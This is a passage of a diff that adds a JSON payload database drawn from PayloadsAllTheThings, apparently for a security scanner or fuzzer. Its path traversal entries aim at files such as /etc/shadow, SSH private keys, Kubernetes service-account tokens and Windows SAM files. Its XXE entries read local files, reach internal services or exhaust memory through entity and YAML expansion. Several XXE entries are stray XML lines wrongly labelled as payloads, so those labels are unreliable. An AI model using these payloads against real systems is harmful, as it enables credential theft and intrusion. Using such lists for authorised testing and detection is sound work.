+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "%uff0e%uff0e%u2215",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "%uff0e%uff0e%u2216",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "..././",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "...\\.\\",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "{{BaseURL}}/.%00./.%00./etc/passwd",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "..;/",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "\\\\localhost\\c$\\windows\\win.ini",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/(S(X))/",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/(Y(Z))/",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/(G(AAA-BBB)D(CCC=DDD)E(0-1))/",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/(S(X))/admin/(S(X))/main.aspx",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/(S(x))/b/(S(x))in/Navigator.dll",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/MyApp/(S(X))/",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/admin/(S(X))/main.aspx",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/admin/Foobar/(S(X))/../(S(X))/main.aspx",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "shortscan http://example.org/",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "url:file:///etc/passwd",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "url:http://127.0.0.1:8080",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/etc/issue",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/etc/group",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/etc/hosts",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/etc/motd",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/self/environ",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/version",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/cmdline",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/sched_debug",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/mounts",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/net/arp",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/net/route",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/net/tcp",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/net/udp",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/self/cwd/index.php",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/proc/self/cwd/main.py",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/var/lib/mlocate/mlocate.db",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/var/lib/plocate/plocate.db",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/var/lib/mlocate.db",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/etc/passwd",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/etc/shadow",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/home/$USER/.bash_history",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/home/$USER/.ssh/id_rsa",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/etc/mysql/my.cnf",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/run/secrets/kubernetes.io/serviceaccount/token",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/run/secrets/kubernetes.io/serviceaccount/namespace",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/run/secrets/kubernetes.io/serviceaccount/certificate",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "/var/run/secrets/kubernetes.io/serviceaccount",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "C:\\Windows\\win.ini",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "C:\\windows\\system32\\license.rtf",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/inetpub/logs/logfiles",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/inetpub/wwwroot/global.asa",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/inetpub/wwwroot/index.asp",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/inetpub/wwwroot/web.config",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/sysprep.inf",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/sysprep.xml",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/sysprep/sysprep.inf",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/sysprep/sysprep.xml",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/system32/inetsrv/metabase.xml",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/system volume information/wpsettings.dat",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/unattend.txt",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/unattend.xml",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/unattended.txt",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/unattended.xml",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/windows/repair/sam",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "c:/windows/repair/system",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      }
+    ],
+    "xxe": [
+      {
+        "payload": "<!--?xml version=\"1.0\" ?-->",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<userInfo>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<firstName>John</firstName>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<lastName>&example;</lastName>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</userInfo>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE data [",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ELEMENT data (#ANY)>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY file SYSTEM \"file:///etc/passwd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "]>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<data>&file;</data>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE foo [",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ELEMENT foo ANY >",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % xxe PUBLIC \"Random Text\" \"URL\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY xxe PUBLIC \"Any TEXT\" \"URL\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<contacts>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<contact>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<name>Jean &xxe; Dupont</name>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<phone>00 11 22 33 44</phone>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<address>42 rue du CTF</address>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<zipcode>75000</zipcode>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<city>Paris</city>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</contact>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "</contacts>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" >",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<foo>&xxe;</foo>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY xxe SYSTEM \"http://internal.service/secret_pass.txt\" >",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY a0 \"dos\" >",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<data>&a4;</data>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
